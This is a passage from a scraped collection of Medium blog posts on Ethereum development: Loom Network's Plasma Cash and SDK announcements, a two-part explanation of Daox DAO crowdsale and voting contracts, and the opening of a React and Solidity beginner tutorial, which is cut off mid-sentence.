Gateway to use these fungible assets on the sidechain.Technical Overview: Movement of a Token Between Mainnet and the Plasma ChainThe Plasma Cash implementation is made up of a Plasma smart contract that lives on Ethereum mainnet, and a Loom sidechain smart contract that communicates with the Plasma contract.In order to use an ERC721 token on the sidechain, the user first sends their token to the Plasma contract.After the token is received, the Plasma contract emits a Deposit event, which is picked up by the listening sidechain. The sidechain proceeds to create a block with a single transaction (this makes the exit process easier) that includes the deposited asset.The user is then credited with a special Plasma Cash token on the sidechain that represents their ownership of the token on Mainnet. They\u2019re free to transact and use that token on the sidechain in any way, including transferring it to other users on the sidechain (by providing a signed transaction to prove the other user is the new owner of the token).The sidechain periodically \u201ccheckpoints\u201d to Mainnet by committing the Merkle root of its blocks to the Plasma contract, showing any changes in ownership of the token.Plasma ExitsWhen the user wants to exit their token from the sidechain, they submit an exit request directly to the Plasma contract on Mainnet (along with a signed transaction from the previous owner as proof if the token was transferred to them).The token then enters a \u201cchallenge period\u201d, in which a challenger can submit evidence of signed transactions that prove the user trying to exit the token is not its valid owner.If the challenge period passes with no successful challenge, the user is able to withdraw their token from the Plasma Contract.Thus, users are able to deposit and withdraw their tokens directly within the Mainnet Plasma contract, removing any risk of the token being stolen from them by the sidechain.Loom\u2013Plasma Flow Diagram:The basic flow between the user, Plasma Cash smart contract on Ethereum mainnet, and Loom sidechain can be seen in the following diagram:Loom\u2013Plasma flow, showing the movement of a token between mainnet and the Loom sidechainWe will be releasing more technical documentation for developers in the near future, but in the meantime, developers can read the source code on github.George recently presented our findings at the Plasma Research Meetup in Tokyo, along with OmiseGo, which will be compiled into an article in the next week or two:We were invited by OmiseGo\u2019s Masaharu Uno-san to present at their Plasma Research Meetup, held at their new Shibuya office.User Experience and Future ImprovementsThe user experience for a Plasma Exit will be very similar to existing experiences with MetaMask or other mobile wallets \u2014 the user will simply need to sign a transaction to initiate the exit:An example of a user-signed transfer using the Loom SDK and deep linking with Trust Wallet.The main difference with Plasma is that instead of having a near-instant transaction, the user will need to wait until their exit passes the challenge period and can be finalized.Thus the user experience when using Plasma Cash is currently weak. However, it can potentially be mitigated using a few optional services that may be developed in the future:Liquidity ProvidersAfter the user requests to exit their token, they could \u201ctrade\u201d their token for an equivalent one from a party who does not mind waiting the full challenge period.The Liquidity Provider would charge a service fee for the trade. This way, the user can pay a fee in order to get their token back immediately and not have to wait the challenge period.This is being discussed in a recent thread in ethresear.ch.Delegated Exits and WatchtowersOther services that could improve the Plasma Cash user experience are Delegated Exits and Watchtowers.Even though the Plasma technique provides the guarantees that a user cannot have their coin stolen, it requires that the user manually call the function on the smart contract to exit their token, as well as monitor the contract for invalid exit attempts of their token so they can challenge it.These UX inconveniences could be mitigated with semi-trusted services that perform these functions on behalf of the user.For example, a \u201cDelegated Exit\u201d service could allow the user to auto-withdraw their token if it is idle on the sidechain for more than 1 hour.Likewise, a \u201cWatchtower\u201d service could monitor the Plasma contract and challenge invalid exits on behalf of users.There is no seemingly good way to make this process trustless, meaning that a user who uses such services would be vulnerable to that service colluding with adversaries to steal their tokens. But such services would be completely optional, for scenarios where users would rather choose convenience over full trustlessness.As you can see, there are still a number of potential complications with the Plasma Cash UX, and this is an area that requires further research.Coming Soon to ZombieChainIn the next week, we\u2019ll be rolling out the testnet of ZombieChain, and the mainnet will be soon to follow.If you missed our previous announcement, ZombieChain is a shared DPoS sidechain to Ethereum with sub-second block times.Developers can deploy their Solidity contracts to ZombieChain and run them for a fixed monthly hosting fee, and their users can experience gas-free transactions, making it ideal for user-facing DApps and games.You can check out the full announcement here.Today\u2019s release adds the Plasma Cash functionality to the Loom SDK, for any developers who want to use it on their own sidechains.But we understand that deploying and running these things in production is complicated, and most DApp developers want to simply focus on building their applications \u2014 not running their own blockchain infrastructure.For that reason, we\u2019ll be adding Plasma Cash functionality to ZombieChain and making it available to all developers on the platform.This will allow ZombieChain developers to give their users the benefits of Plasma Cash out of the box without any additional configuration, and will allow us to experiment with providing services \u2014 like the Liquidity Providers discussed above \u2014 to all users on the network.We\u2019re truly excited to release this contribution to the blockchain world, and look forward to future collaborations to add additional functionality and further improve the Plasma user experience.Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 2, "tags": ["Blockchain", "Ethereum", "Programming", "Solidity", "Cryptocurrency"]}, {"title": "How Daox Works \u2014 Part 2", "post_link": "https://medium.com/daox/how-daox-works-part-2-824e01b477b9?source=search_post", "author_name": "Anton Vityazev", "author_link": "https://medium.com/@vityazevanton", "publish_date": "2018-05-18", "last_modified_date": "2018-06-20", "readtime": "8.24", "claps": 663, "voters": 143, "content": "How Daox Works \u2014 Part 2Managing DAOAnton VityazevFollowMay 18, 2018 \u00b7 9 min readIn the previous part of this article the process of a DAO creation and the process of crowdsale were explained. This part explains what types of votings are presented in DAOs and how they work.All code presented in this article is provided with .js extension only for correct highlight. The real extension is .solVotingsIf the funds collected during the crowdsale equal or exceed the softCap, then voting functions become accessible to the participants of a DAO. A separate contract called VotingFactory is in charge of creating various votings.The address of the above-mentioned contract is set when the CrowdsaleDAO contract is created. When attempting to create a particular voting with a function from a DAO, it delegates a call with all the transferred parameters to the VotingFactory contract, which in turn creates a voting contract and returns its address back to the DAO.All in all there are 4 types of voting in a DAO:Regular \u2014 voting that does not change the DAO\u2019s current state in any way, whatever the result is, and serves only to let the participants of the DAO to decentrally voice their opinions on a question that is being discussed in voting.Withdrawal \u2014 voting primarily required by the team members, which allows for receiving funds from the deposit established in a DAO during the crowdsale.Refund \u2014 voting that allows members of a DAO to declare a project as failed for one reason or another, and to reimburse the funds from the DAO\u2019s remaining amount, which will be distributed proportionally to the DAO token-holders.Module \u2014 service voting, which allows for changing the address of one module for the address of another module where the mistake has been eliminated, in case an error or a bug is found in one of the functional modules linked to a DAO. This voting also allows for changing the address of the Voting factory contract, in case there are problems related to the votings that need to be fixed.Before any voting is created the VotingFactory checks that the voting was generated by the member of a DAO or member of a project team, namely by the holder of tokens that have been distributed in this particular DAO during the crowdsale. The VotingFactory also checks that the function itself was called by the contract of the DAO, not by a random address. There are individual checks as well, but they will be described further on.Each of 4 types of voting has its own contract with specific functionality, but common features are combined into a separate contract with basic voting functionality, that is called Voting. Thus, when the functionality overlaps, all votings delegate the execution request to the Voting contract.Figure 1: voting creationLet us consider the basic Voting contract, and then take a good look at each type of voting.VotingAs seen from the code, the basic Voting contract has a functionality to create votings, assign votes to one option or another and to complete the voting process. All modifiers that votings share in common are stored here as well. Let us have a look at how each function works, one-by-one.create \u2014 this function receives all the common parameters from the voting contracts and sets their value to storage variables. It checks that the duration of voting is indicated correctly and will allow participants to have enough time to get acquainted with voting procedures and take part in the voting itself.addVote \u2014 this function gets information about an option that the participant wants to vote for from the voting contracts, and it also receives token balance of the participant, considers the participant as having voted and assigns value that is equal to the number of tokens hold by the participant to the selected option. After that, the tokens of the participant will be frozen until the end of voting. This is done so that after the voting the participant would not be able to transfer his tokens to another address, that could use these tokens one more time during the same voting. Before the function is performed, it checks that the voting is still in progress, that a person who is voting is not a team member, but a member of a DAO, that he has not voted yet and that he votes for the selected option.finish \u2014 this function completes the voting and sums it up, having checked in advance that the completion time has come and the voting has not yet been completed. Then, votes for each option, as well as the total number of votes in reference to all possible options are being counted, upon which the results are calculated.RegularThis is the simplest type of voting used to handle practical issues that do not result in affecting the DAO in anyway. It has from 2 to 10 user-defined options, and each person taking part in voting should choose one from those. In order to be created, this voting should have indicated name, description, duration in seconds, and array of options.The code used to create this voting is given below:When creating this type of voting, the number of transmitted options is checked, and if it is either less or more than the number of predefined options, then the creation process is being halted.The addVote function and finish function do not have any additional code for this type of voting, and are entirely described in the Voting contract. An option that got the most votes in tokens is regarded as an accepted one.Figure 2: voting completionWithdrawalThis type of voting is designed to make requests for partial withdrawals of the raised proceeds from a DAO.When creating this kind of voting, it is necessary to indicate name, description, duration, withdrawal amount, address that the funds would be transferred to and currency, that is, if the team members would like to get the funds in Ether or in DXCs.If the currency for funds withdrawal is Ether, then the sum should be indicated in wei. Before the voting contract is created, the VotingFactory checks whether the address given for funds withdrawal is on a list of accepted addresses, that was specified in the setWhiteList function before the start of the crowdsale.Options for this type of voting are generated automatically, and they are only: \u201cyes\u201d and \u201cno\u201d.The code for this type of voting looks as follows:Before the voting is created, it is checked that the withdrawal amount is more than zero and that there is sufficient amount of funds in the DAO.The voting function addVote of the Withdrawal voting is entirely executed in the basic Voting contract, while the function of voting completion has an additional code:An option that has gained 50% + 1 token from all the tokens taking part in the voting will be regarded as an accepted one. In case if upon the completion of the voting, the \u201cYes\u201d option got the most votes, the DAO, for which the voting was created, calls the withdrawal method, the implementation of which is in the VotingDecisions module. Such parameters as the sum, currency of the withdrawal and the address which the funds should be transferred to, are passed to that function.The implementation of the withdrawal method looks as follows:Before the execution it is verified that the DAO is not in the refund phase at the moment, and that the call originated exactly from the voting contract. If the verification is successful, the date of the last withdrawal is set and the transfer takes place.Figure 3 voting completion of the \u2018Withdrawal\u2019 typeThe date of the last withdrawal is used to prevent lock-up of the funds in a DAO. If the last withdrawal date was more than four months ago, a call to the function, that transfers a DAO to the state of refund to investors mode, becomes available. More details on that state is given below:RefundThis voting makes it possible to activate the refund state for a DAO. Only a name, description and duration are needed to create this type of voting.The code for creating this method is provided below:The voting options are created in the same way as in the Withdrawal. The addVote function does not contain any additional code.There is additional code in the \u2018finish\u2019 function:Voting will be considered successful if the \u201cYes\u201d option gets more than 90% of all the issued tokens (excluding team-members tokens).That way, upon the completion of the DAO voting, the makeRefundableByVotingDecision function is called form the voting creator, implementation of which is in the VotingDecisions module.The code of the function looks as follows:The function checks that the call had been made from the voting contract, and then calls the makeRefundable function. The function is implemented as follows:A verification that the DAO has not been previously transferred to the refund stateis made, then, if the verification is passed, the transition to the corresponding state occurs and the rate for both currencies is recalculated in accordance with the remaining funds in the DAO.When calculating the new rate, the multiplier variable is multiplied by 100,000. This is done in order to avoid having a fractional division result, which is interpreted as 0 in solidity. In subsequent functions, the result is divided by the same multiplier to bring the data to the correct values.Figure 4: voting completion of the Refund typeAfter transition to the refund phase, it becomes possible to call the refund function implemented in the Payment module.The function verifies that the DAO is in a refund state and that the refund request is not made by a team member. After that, the participant is refunded in accordance with Ethereum and DXC tokens, remaining on the balance of a DAO. The amount of the refund is calculated based on the amount of the participant\u2019s tokens and a new rate.ModuleThis is a special type of voting designed to upgrade the code of a DAO. This type of voting allows to change the address of one of four functional modules or the VotingFactory.To create this type of vote, one should pass such parameters as name, description, duration, sequence number of the module that is to be replaced and the address it will be replaced to.The voting is created using the following code:Before the voting creation, the verification is made that the passed sequence number of the module falls within valid values. The acceptance of the vote and voting termination rules coincide with the refund type, except that 80% of the votes instead of 90% are required for this type of vote to be accepted.The completion has the following code:Thus, if the vote is successful, a call to one of the five functions of a DAO is performed to set the address of the module based on the supplied sequence number.Each function is verified using the canSetAddress modifier, which allows to change the address of the module only if the function call was made by the voting contract or the address has not yet been set at all and is being set by the contract\u2019s owner. Therefore, module addresses can be changed only by means of this vote.Figure 5: voting completion of the Module typeConclusionTo sum up, this part of the article described all voting types and their features. Hope that this article helped every reader to understand how Daox works and feel its potential for fundraising process.Full code of smart contracts that are used by Daox could be found in our github repository: https://github.com/daox/daox-contracts", "responses": 0, "tags": ["Ethereum", "Blockchain", "Dapps", "Solidity", "Smart Contracts"]}, {"title": "Loom Network SDK Alpha Release \u2014 First 5 DAppChains Announced + SDK Roadmap", "post_link": "https://medium.com/loom-network/loom-network-sdk-alpha-release-first-5-dappchains-announced-sdk-roadmap-1dddec789004?source=search_post", "author_name": "Matthew Campbell", "author_link": "https://medium.com/@kanwisher", "publish_date": "2018-04-02", "last_modified_date": "2019-08-19", "readtime": "4.32", "claps": 2472, "voters": 165, "content": "Loom Network SDK Alpha Release \u2014 First 5 DAppChains Announced + SDK RoadmapMatthew CampbellFollowApr 2, 2018 \u00b7 5 min readUpdates:We publicly released the Loom SDK beta in June, 2018. Check out the announcement and the docs site.We now also have 3 shared DAppChains running in production: PlasmaChain, GameChain, and SocialChain.In mid-March, Loom Network officially went live, with the launch of DelegateCall \u2014 the first DApp running 100% on a Loom Network DAppChain.This is big news for the Ethereum community: It\u2019s one of the first examples of a highly scalable and performant DApp running on a sidechain backed by Ethereum, and even Vitalik took notice. (We\u2019re now in very early exploratory talks with the Plasma team about the possibility of incorporating Plasma into Loom DAppChains).We announced a beta application for developers to test the Loom SDK, and have been amazed by the response \u2014 we\u2019ve received a wave of applications from developers working on really interesting DApps that simply aren\u2019t possible with the current infrastructure due to scaling limitations.Today with the Alpha release of the Loom SDK, we\u2019re starting to give the very first of these developers access to start building on Loom Network.Update for developers who have appliedFor those who have applied and haven\u2019t heard from us yet, take a deep breath, we are just starting to open up the beta now.Currently we have 5 internal projects at Loom (see below for details). We also have allowed 4 external parties to join our beta.Over the next 2 weeks we plan to open up to more projects, with an initial focus on projects focused around games and social apps, and we will continue to slowly trickle in more teams over time.TimelineApr: 0.5 release, adding more users to the Golang SDKMay: 0.8 release of Solidity support, and opening beta up to more peopleJune: 1.0 public beta release \u2014 the SDK will be opened up for all developers to useCost to developersThere are no ongoing fees \u2014 developers simply need to own enough Loom tokens to cover their usage tier. Buy once, use forever.We have explained in more detail how the Loom Token will work for developers in this post:LOOM Token FAQs \u2014 You got questions, we got answers!Last week, we officially launched Loom Network, and with it the LOOM token.medium.comInternal Projects1. CryptoZombies.io \u2014 Interactive Solidity Code SchoolThe famous CryptoZombies code school that has had over 150k users is being converted to a DAppChain. We are super excited as it means on day 1, it will be one of the largest sidechains in the blockchain world.2. The Adventures of EtherBoy in Blockchain WorldA side-scrolling action game that stores its state on a DAppChain. It allows items, achievements, and other rewards to be transferred off the DAppChain onto Ethereum mainnet.3. DelegateCall.comNeeds no introduction, but the first Question-and-Answer site on the blockchain. Learn more about it how DelegateCall uses DAppChains.Delegatecall was the first proving ground for DAppChains. It has now processed over 18,000 blocks and is still running strong.We\u2019ll be continuing to make further improvements over the coming weeks, stay tuned for updates.4. CryptoZombies BattlegroundsHearthstone-style Collectible card game, with purchasable decks. Should be fun to see a PvP game on a blockchain.Cards are provably rare and can be traded freely on the blockchain as non-fungible tokens. Lots of interesting challenges in building this, we will post in upcoming blog posts.5. CryptoZombies RancherPokemon style battle game, where you can grow, clone and mutate your zombies to give them powers to beat other players. With all battles on DAppChains, and cross chain transfers with Ethereum, this is an exciting project.Features of the Loom SDKWe\u2019ll be slowly releasing more and more details and documentation around the SDK in the coming months, but here is a top-level overview:Blockchain FeaturesTokens \u2014 ERC20 compatibleTokens \u2014 ERC721 Non-fungible compatible (Think CryptoKitties)pBFT Practical Byzantine Fault ToleranceDPoS Delegated Proof of StakeTransactional DataStoreProtobuf supportMigration FrameworkHard Fork ManagerGolang Smart Contract support (Solidity coming soon, see below)Unity client SDK (.NET)Javascript client SDKInterBlockchain Communication, see belowCross-Blockchain FeaturesEthereum ConnectivityCoin copying and transfering between chainsAllow assets like ERC721 tokens to be mirrored into the DAppChainPegging (this is in future releases)Gaming FeaturesMatchmakingOnline Presence (Messaging in later releases)ConclusionThis was a whirlwind update on all the progress from the Loom SDK Beta. We have gotten a sampling of all the 5 internal DAppChains at Loom, which should give you a good idea of the types of apps that will be supported by the SDK.Stay tuned \u2014 we will be breaking down each part in technical detail in upcoming blog posts!All this look good? Sign the beta application to get it early!Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 11, "tags": ["Blockchain", "Solidity", "Roadmap", "Sdk", "Loom Network"]}, {"title": "How Daox Works \u2014 Part 1", "post_link": "https://medium.com/daox/how-daox-works-part-1-a1d2a456cbe7?source=search_post", "author_name": "Anton Vityazev", "author_link": "https://medium.com/@vityazevanton", "publish_date": "2018-05-15", "last_modified_date": "2018-06-12", "readtime": "6.93", "claps": 487, "voters": 124, "content": "How Daox Works \u2014 Part 1Creating a DAO and Raising FundsAnton VityazevFollowMay 15, 2018 \u00b7 7 min readThis article is to help developers and people who are interested in the Daox project understand how this platform works, what the main stages of lifecycle for each created DAO are, and how different components of the platform connect with each other. The first part explains and describes lifecycle stages starting from the creation of a DAO and to the end of the crowdsale. By DAO we mean Daox-based organization (a DAO created using Daox smart contracts on the Ethereum blockchain).All code presented in this article is provided with .js extension only for correct highlight. The real extension is .sol1. Creating a DAOAll DAOs are created with a special factory contract that is called CrowdsaleDAOFactory. The factory keeps settings that are constant for all DAOs, which in turn are transferred to each organization when they are being established.For the establishment of new DAOs createCrowdsaleDAO function is used. The source code of this function is given below:This function uses the DAODeployer library for uploading an organization with defined parameters to the Ethereum network.This function uses the DAODeployer library for uploading an organization with defined parameters to the Ethereum network.The name, description as well as two addresses and transferred as parameters:The Voting Factory address is needed to create proposals in case the crowdsale is successful.The address of the service contract is used to send commissions to the the platform. An important note: the commission is charged only from payments transferred via the daox.org interface and when using Ether (ETH). No commission is charged from investments made by means of the DXC token.After that, the addresses of different modules are added to the newly created organization; they will be closely described further on.For different parameters to be assigned correctly in the contract\u2019s storage, a change of ownership to an address initiating this code is required (most often this is a special account owned by Daox). As a result of an execution of the function an individual contract CrowdsaleDAO is created.Figure 1: creation of a DAO2. Initialization of DAO\u2019s special parameters. DAO modulesImplementation of the DAO\u2019s contract is split up into 4 separate contracts (so called modules), each encapsulating a code that is in charge of certain functionality. Currently modules are divided according to the task in the following way:State \u2014 initialization of technical parameters, creation of a commission contract.Crowdsale \u2014 initialization of parameters, incoming payments processing, completion of the token generation event.Payment \u2014 outgoing payments processing, for instance a refund in case of an unsuccessful crowdsale.VotingDecisions \u2014 finalizing various proposals by putting into operation the relevant voting decisions.Most functions in the CrowdsaleDAO in fact are just a proxy \u201ccover\u201d, in other words by means of a delegatecall the module function is called, that changes the storage of the called contract. This architecture is necessary so that a contract fits in the block gas limit, as well as that there is a possibility to \u201cupdate\u201d the source code if required.Figure 2: initialization of technical parameters of a DAO2.1 Technical ParametersAfter the creation of a DAO it is necessary to initialize several internal parameters, as well as to create a commission contract. This is executed by the initState function, that is located in the State module.The source code of the function is given below:For each organization, the token is created separately, that is why it is necessary to save its address in the contract\u2019s storage.The DXC address is required for the correct payment processing by this token.At the end of the function the canInitStateParameters flag sets to false, which in turn guarantees that the variables will be initialized only once. In case the DAO is created via the Daox platform, the initialization of the parameters is called from the service account.2.2 Crowdsale variablesThe initCrowdsaleParameters function of the Crowdsale module is in charge of the crowdsale variables:This initialization of parameters takes place only once. Just as it is the case with the previous function, this one is being called from the service account as well if the DAO is created via the Daox platform.In addition, such functions as initBonuses and setWhiteList could be used for customizing the process of crowdsale. Due to technical reasons, they can not be moved to the module that is in charge of setting up the crowdsale, that is why they are implemented directly in the CrowdsaleDAO contract.The setWhiteList function allows for listing the addresses that the funds could be withdrawn to:The canSetWhiteList flag provides a one-time function invocation. If a DAO is being created via the Daox platform the invocation will be performed by the service account.The initBonuses function is meant to determine team members of a DAO, their bonuses (amount of tokens that they will get), time period that the bonus (team) tokens will be locked-up for.It is also used to specify the identificator that indicates whether the withdrawal address is a person or it is an address for service-related objectives (for instance, a fund for the bounty program). Moreover, the function allows for defining token sale periods and the amount of bonuses in each period.The function checks whether the params for crowdsale are not set yet or set, but the time of the crowdsale launch has not yet come. This check does not allow to change bonuses at a time when the crowdsale is already in progress. As in the examples above, the canInitBonuses variable does not allow to set the bonuses multiple times.3. CrowdsaleAt a time when the current timestamp becomes greater than the timestamp in the startTime variable, the crowdsale is considered to have begun and it becomes possible to transfer funds to the DAO.It is possible to participate in a crowdsale both with Ether and with the DXC tokens.3.1 Participating with EtherThere are two ways one can participate in a crowdsale of a DAO with Ether: by means of a commission contract, which is created when the initStatefunction of the State module is being called, or by transferring funds directly to the address of the DAO\u2019s contract.Figure 3: transferring funds to a DAO through the commision contractIf the funds are transferred via the daox.org service, then the transaction is automatically made by means of a commission contract. The code for such a contract is as follows:When receiving Ether, this contract does not call DAO\u2019s standard payable fallback function, but it calls its specific function for processing the payment transferred via the daox.org service. Both, a standard payable fallbackfunction and a special handleCommissionPayment function call the handlePayment function of the Crowdsale module. The difference is in the value of the commission parameter, that is being passed to the function.The handlePayment function looks as follows:The code shows that in case the value of the commission parameter is equal to \u201ctrue\u201d, the commissionRaised variable increases by the amount of the received funds.The function is implemented in a way that the user gets tokens right after the funds are transferred, not upon the completion of the crowdsale. Modifiers CrowdsaleIsOngoing and validEtherPurchase are required to check that the fund raising is still in progress and that the amount of the collected funds does not exceed the hardCap respectively.Figure 4: transferring funds directly to the address of the DAO contract3.2 Participating by means of DXCsTo participate in a DAO by means of the DXC tokens, it is necessary to call the contributeTo function from the DXC contract. This can be done by sending the address of the DAO where the funds should be transferred to, as well as the amount of transfer to the function:The validDXCPurchase modifier functions the same way as validEtherPurchase, except the token. The onlyDXC modifier checks that the function was called from the DXC token contract, not from some random address.Figure 5: investing in a DAO by means of DXC token3.3 Crowdsale completionAt a time when the current timestamp becomes greater than the timestamp in the endTime variable, the crowdsale is considered to have been completed, payments are not accepted anymore and it becomes possible to call the finish function that sums up the results.The finish function calculates the amount of the funds collected in Ether and in DXC tokens and decides whether the crowdsale was conducted successfully.If the softCap requested by the team was not reached, the DAO switches into the refundableSoftCap phase, when all the participants can get their transferred funds back, and the tokens that they received are burnt.For refunds it is needed to call the refundSoftCap function, the implementation of which is stored in the Payment module:If the softCap is reached, the handleFinishedCrowdsale function is called automatically from the DAOLib library.This function calculates the number of generated tokens and transfers a certain amount of tokens indicated for each individual when the initBonusesfunction was called to each member of the team. After that, the function freezes the transferred tokens for a period that was specified when the initBonuses function was called.Additionally, this function transfers commission from the collected funds to the address of the Daox service contract. If the crowdsale is finished successfully, various voting functions become accessible.ConclusionThis part of the article explains that in case of an unsuccessful crowdsale the DAO\u2019s lifecycle ends. Another case (when the crowdsale succeeds) will be considered in the next part of this article and will describe voting processes in a DAO which include withdrawal, refund, etc.Full code of smart contracts that are used by Daox can be found in our github repository: https://github.com/daox/daox-contracts", "responses": 2, "tags": ["Blockchain", "Smart Contracts", "Dapps", "Solidity", "Ethereum"]}, {"title": "React & Ethereum: Getting Started With The Minimum Toolset Required \u2014 Part 1 of 4", "post_link": "https://levelup.gitconnected.com/https-medium-com-zubairnahmed-react-ethereum-getting-started-with-the-minimum-toolset-required-part-1-of-4-9562efa23d18?source=search_post", "author_name": "Zubair Ahmed", "author_link": "https://levelup.gitconnected.com/@zubairnahmed", "publish_date": "2017-11-09", "last_modified_date": "2019-04-30", "readtime": "8.02", "claps": 1260, "voters": 151, "content": "React & Ethereum: Getting Started With The Minimum Toolset Required \u2014 Part 1 of 4Zubair AhmedFollowNov 9, 2017 \u00b7 9 min readLearn how to create a smart contract and deploy it to the Ethereum blockchain, using the minimum toolset required: Remix, Metamask, and any text editor.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022 Part 1 \u2022\u2022\u2022 Part 2 \u2022\u2022\u2022 Part 3 \u2022\u2022\u2022 Part 4 \u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022Pixabay image, released under Creative Commons CC0.Update: This blog series is no longer maintained.IntroductionThe essence of this post is to show how React can talk with the Ethereum blockchain. Only three tools will be used, so there\u2019ll be a minimum learning curve. The project will be broken down into five phases so it can be easily followed.Intended audience: Students / beginners / intermediate beginners, and anyone with curiosity.Prerequisites: Basic familiarity with JavaScript, React, npm, and the command line. Simple knowledge of ether and gas.Solidity will be used to write our smart contract, though familiarity with it is not needed. I\u2019ll do my best to explain what\u2019s happening, and I\u2019ll link relevant key words to the Solidity documentation for easy reference.Design note: I\u2019m designing this post to be a learning experience which aims to deliver a simple and detailed understanding of the toolset used and the Solidity programming language. Practicing, recalling from memory, and following processes are part of this experience.GitHub repository: If you\u2019d like, you can code along with my repository. I\u2019ve added comments as a guide.Personal process note: I would like to mention that even though these posts appear linear, my process of learning and coding this example was far from it. It was non-linear, a bit like a spiral or a helix. I applied a rapid-prototyping / rapid-iteration process that I learned while attending Stanford University, one where I tried something small, debugged it, tried again, debugged again, and repeated until I got to my goal. In moments of frustration, I took walking breaks, cleared my head, consulted Google search, and tried again. I feel this process is universal in the arena of writing code. I could definitely be wrong about that, though I\u2019ve seen it play out in many of my peers. I\u2019ve learned to love this process and have fun with it.ToolsetFor this project, we\u2019ll be using:Remix IDE: A Solidity development environment provide by the Ethereum development team. It\u2019s available online here. Please keep it open as we work through this learning experience.Metamask: A Chrome extension used to engage the Ethereum blockchain. Please install it and setup your account. We\u2019ll use this to connect with the Ethereum Ropsten Testnet.Text editor: Any text editor you chose will work great. We\u2019ll be using an editor starting in Phase 2 to wire up React with the Ropsten Testnet Etherium Blockchain using Metamask.Overview of PhasesEach phase aims to show specific nuggets of knowledge. They are self-contained and build on top of each other, as in, Phase 2 builds on the work in Phase 1.Phase 0: Get familiar with Remix, and create a smart contract scaffold.Phase 1: Create a public variable, deploy smart contract on JavaScript VM, and interact with it in Remix.Phase 2: Create a private variable, deploy smart contract to Ethereum Ropsten Testnet, and interact with private variable on a React frontend using Metamask as the intermediary.Phase 3: Manipulate the state of a smart contract from React.Phase 4: Engage a conditional on a smart contract, and explore its implications.Phase 0: Remix IDE & Smart Contract ScaffoldWe\u2019ll open up Remix IDE and begin by becoming familiar with its layout, specifically with the right column. We\u2019ll start there.Right column of Remix IDE with the Compile tab openThe Compile tab compiles the source code present in the editor when Remix is loaded. After compiling, Remix provides a Static Analysis, which offers warnings and errors that we can use to edit our code. We can safely ignore warnings for now.By default, the \u2018Auto Compile\u2019 box near the top is checked. I personally prefer to uncheck it, so the compiler doesn\u2019t trigger with each change I make in the editor. Then I manually click the \u2018Start to compile\u2019 button each time I need the source code compiled.Next, let\u2019s look at the Run tab.Right column of Remix IDE with the Run tab openWe deploy smart contracts from the Run tab. Please note the Environment dropdown menu and the light-red Create button. First we select the Environment to declare the context of our deployment, then we click Create to make the smart contract.Under the Environment menu, we\u2019ll use these options:JavaScript VM: To deploy and play with our smart contract right on our browser.Injected Web3: To deploy our smart contract through Metamask on the Ethereum Ropsten Test Network or the Ethereum Main Network.We\u2019ll use the Compile and Run tabs frequently in this project.The left column in Remix is a file explorer, and the center column contains the code editor and a console. I think these are reasonably self-explanatory.Smart Contract ScaffoldRemix usually comes shipped with some code. Please delete this code, and change the filename on the left tab to ReactExample.sol. Then we\u2019ll enter our code in the editor found in the center column.Initial scaffold for a Solidity Smart ContractNote: I offer an image so one can practice typing it, instead of copy / pasting it. This\u2019ll help build memory, as well as be a better learning experience.Since familiarity with Solidity is not assumed, I\u2019ll try to explain each section of code.Line 1: Tells the Solidity compiler that the source code is written in version 0.4.11. Newer versions will be supported up to, but not including, version 0.5.0. I picked version 0.4.11 arbitrarily \u2014 in a real-life project, picking a version will be a technical decision weighing pros, cons, and trade-offs.Line 4: Declares a state variable of type address, which is named owner. It is declared private so its value isn\u2019t visible outside our contract. An address type holds a 160-bit value, the size of an Ethereum address. State variables are stored in a smart contract\u2019s storage, which is a persistent memory area.Line 6: Provides a constructor function that\u2019ll run once, when the smart contract is created. It\u2019s visibility is set to public, which means it\u2019s visible to everyone. All functions in our contract are public, which is the default visibility modifier if none are specified. The constructor\u2019s name must be the same as the contract\u2019s name, which is ReactExample in our case.Line 7: Initializes the owner to be the address of who created the contract. The creator\u2019s address is contained in msg.sender. Note: In JavaScript and other programming languages, we\u2019d need the this keyword to refer to the smart contract instance. In Solidity, it\u2019s not required in this context, but required for external function calls.Line 10: Provides a function which the owner can call in case the smart contract is compromised. Invoking it will destroy the contract.Line 11: Ensures that only the owner can self-destruct the contract. require (condition) throws an exception if the condition inside its parentheses is false.Line 12: Destroys the contract. Recall: owner is an address, so selfdestruct (owner) is going to forward its balance to the owner.Line 15: Provides an anonymous function called a fallback function. The payable modifier ensures the function can receive ether. The revert () call gives back ether to whoever invokes this function.That\u2019s it for Phase 0. Now that we\u2019re a little more familiar with Remix and some basic workings of Solidity, let\u2019s move on to Phase 1 and play with a deployed smart contract.Phase 1: Remix\u2019s JavaScript VM & Interacting with Smart ContractNow that we have a basic smart contract, we\u2019ll add a public state variable, deploy the contract, and interact with it \u2014 all inside Remix IDE.First, let\u2019s add a two lines of code:Public state variable of type string, called you_awesomeLine 5: Declares a public string type variable called you_awesome. When a public state variable is declared, it\u2019s stored in the smart contract\u2019s storage, and Solidity automatically creates a public getter function for it. Recall: storage is a persistent memory area of smart contracts. This public getter function is what we\u2019ll be playing with in this section.Add line 9, which initializes the you_awesome variable to \u201cYou\u2019re awesome\u201dLine 9: Initializes the you_awesome variable with the value \u201cYou\u2019re awesome\u201d. Recall: The constructor function is called only once, when the contract is created. So far, we haven\u2019t deployed our contract yet.First Deployment of Smart Contract on JavaScript VMGeneral process note: Please remember this process. We\u2019ll refer to it in future phases. Any time we\u2019re deploying our smart contract, in any Environment context, we\u2019ll follow these steps:First click \u2018Start to compile\u2019 button on the Compile tab.Once our source code is compiled and the analysis is checked, we\u2019ll click the Run tab.Then we\u2019ll select either JavaScript VM or Injected Web3 in our Environment dropdown menu.Finally, click the \u2018Create\u2019 button.Debug note: If not signed into Metamask in future phases, Injected Web3 will display an error. Please ensure you are signed in while working on this project. This note does not apply yet, but will be relevant later.For our first deployment, we\u2019ll use the JavaScript VM environment.In general, while rapidly-iterating on our smart contract code, we\u2019ll always deploy on the JavaScript VM environment since it\u2019s fast and runs on our browsers. It\u2019s a great place to test our experiments, 